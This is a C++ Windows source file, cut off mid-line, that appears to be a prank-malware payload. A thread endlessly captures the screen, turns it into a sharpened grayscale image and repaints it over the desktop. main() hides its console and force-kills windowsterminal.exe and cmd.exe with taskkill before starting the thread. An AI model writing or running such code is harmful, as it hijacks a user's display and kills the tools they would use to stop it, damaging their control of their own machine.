#include <windows.h>
#include <algorithm>

DWORD WINAPI shader(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h; 
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;

	void* pBits;
	HBITMAP hbm = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
	HDC hdcMem = CreateCompatibleDC(hdc);
	SelectObject(hdcMem, hbm);

	while (1) {
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		DWORD* pixels = (DWORD*)pBits;
		for (int y = 1; y < h - 1; y++) {
			for (int x = 1; x < w - 1; x++) {
				int idx = y * w + x;
				DWORD pCenter = pixels[idx];
				DWORD pUp = pixels[idx - w];
				DWORD pDown = pixels[idx + w];
				DWORD pLeft = pixels[idx - 1];
				DWORD pRight = pixels[idx + 1];
				int grayCenter = (GetRValue(pCenter) * 3 + GetGValue(pCenter) * 6 + GetBValue(pCenter)) / 10;
				int grayUp = (GetRValue(pUp) * 3 + GetGValue(pUp) * 6 + GetBValue(pUp)) / 10;
				int grayDown = (GetRValue(pDown) * 3 + GetGValue(pDown) * 6 + GetBValue(pDown)) / 10;
				int grayLeft = (GetRValue(pLeft) * 3 + GetGValue(pLeft) * 6 + GetBValue(pLeft)) / 10;
				int grayRight = (GetRValue(pRight) * 3 + GetGValue(pRight) * 6 + GetBValue(pRight)) / 10;
				int sharpGray = grayCenter * 5 - grayUp - grayDown - grayLeft - grayRight;
				sharpGray = sharpGray < 0 ? 0 : (sharpGray > 255 ? 255 : sharpGray);
				pixels[idx] = RGB(sharpGray, sharpGray, sharpGray);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		Sleep(500);
	}
	DeleteObject(hbm);
	DeleteDC(hdcMem);
	ReleaseDC(0, hdc);
	return 0;
}
int main(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
	AllocConsole();
	FreeConsole();   // console detach

	ShellExecuteA(NULL, NULL, "taskkill", "/f /im windowsterminal.exe", NULL, SW_SHOWDEFAULT);
	ShellExecuteA(NULL, NULL, "taskkill", "/f /im cmd.exe", NULL, SW_SHOWDEFAULT);
	HANDLE waeform = CreateThread(0, 0, shader, 0, 0, 0);
	Sleep(